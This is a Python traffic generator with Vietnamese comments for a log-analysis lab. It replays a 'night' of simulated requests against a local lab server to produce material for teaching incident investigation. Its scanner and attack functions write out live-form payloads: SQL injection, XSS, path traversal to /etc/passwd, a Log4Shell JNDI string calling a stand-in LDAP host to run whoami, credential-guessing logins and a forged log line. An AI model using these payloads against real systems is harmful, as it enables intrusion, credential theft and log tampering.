#!/usr/bin/env python3
"""tao-luu-luong.py — "một đêm" lưu lượng nén vào ~2 phút cho Lab 10 (CHỈ bắn vào lab của bạn).
Khách giả lập ở nhiều IP (RFC 5737, không có thật) qua X-Forwarded-For; có người dùng thường, một máy quét,
một đợt dò mật khẩu, một khách tự đóng kết nối, request quá chậm, và một lần app bị sập.
  python3 tao-luu-luong.py http://127.0.0.1:41080
"""
import http.client, json, sys, threading, time, urllib.parse

GOC = urllib.parse.urlparse(sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:41080")
seed = 2026
def rnd():
    global seed
    seed = (seed * 1103515245 + 12345) % 2147483648
    return seed / 2147483648

UA_TRINH_DUYET = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Safari/537.36"
NGUOI_DUNG = [f"198.51.100.{i}" for i in (10, 11, 12, 14, 17, 23, 31, 42)]

def goi(ip, method, path, body=None, ua=UA_TRINH_DUYET, timeout=15, them=None):
    c = http.client.HTTPConnection(GOC.hostname, GOC.port, timeout=timeout)
    h = {"X-Forwarded-For": ip, "User-Agent": ua}
    if body is not None:
        h["Content-Type"] = "application/json"
    if them:
        h.update(them)
    try:
        c.request(method, path, body=body, headers=h)
        r = c.getresponse(); r.read(); return r.status
    except Exception as e:          # khách tự bỏ đi (timeout) ⇒ nginx ghi 499
        return type(e).__name__
    finally:
        c.close()

def nguoi_dung_thuong(n):
    for _ in range(n):
        ip = NGUOI_DUNG[int(rnd() * len(NGUOI_DUNG))]
        x = rnd()
        if x < 0.70: goi(ip, "GET", "/api/products")
        elif x < 0.85: goi(ip, "GET", "/api/report")
        elif x < 0.93: goi(ip, "GET", f"/api/orders/{1000 + int(rnd() * 50)}")
        else: goi(ip, "GET", "/")
        time.sleep(0.15)

def may_quet():
    ip, ua = "203.0.113.66", "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000003)"
    for p in ["/.env", "/.git/config", "/wp-login.php", "/phpmyadmin/", "/admin/", "/server-status",
              "/api/products?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users--",
              "/api/products?q=%3Cscript%3Ealert(1)%3C/script%3E",
              "/static/..%2f..%2f..%2fetc%2fpasswd", "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh",
              "/backup.zip", "/config.php.bak", "/actuator/env"]:
        goi(ip, "GET", p, ua=ua); time.sleep(0.05)
    # dò Log4Shell: chuỗi JNDI nhét vào User-Agent và đường dẫn (bài 10.7)
    goi("203.0.113.66", "GET", "/api/products?x=%24%7Bjndi%3Aldap%3A%2F%2F203.0.113.66%3A1389%2Fa%7D",
        ua="${jndi:ldap://203.0.113.66:1389/Basic/Command/whoami}")

def do_mat_khau():
    ips = ["192.0.2.51", "192.0.2.52", "192.0.2.53"]
    for i in range(18):
        ip = ips[i % 3]
        goi(ip, "POST", "/api/login", body=json.dumps({"user": f"user{i:02d}@example.com", "password": "123456"}),
            ua="python-requests/2.32.3")
        time.sleep(0.1)

def main():
    t = [threading.Thread(target=nguoi_dung_thuong, args=(420,))]
    t[0].start()
    time.sleep(3); may_quet()
    time.sleep(2); do_mat_khau()
    # chèn log: tên đăng nhập chứa xuống dòng + một "dòng log giả" (bài 10.9)
    goi("203.0.113.66", "POST", "/api/login",
        body=json.dumps({"user": "bob\n{\"level\":30,\"msg\":\"login ok\",\"user\":\"admin\"}", "password": "x"}), ua="curl/8.5.0")
    goi("198.51.100.23", "GET", "/api/report", timeout=0.5)                       # khách bỏ đi ⇒ 499
    goi("198.51.100.17", "GET", "/api/export")                                   # quá 5 s ⇒ 504
    goi("198.51.100.17", "POST", "/api/login", body=json.dumps({"user": "a", "pad": "x" * 2000}))  # 413
    time.sleep(15)
    goi("198.51.100.42", "GET", "/api/crash")                                    # app sập ⇒ 502 vài giây
    t[0].join()
    print("xong")

main()
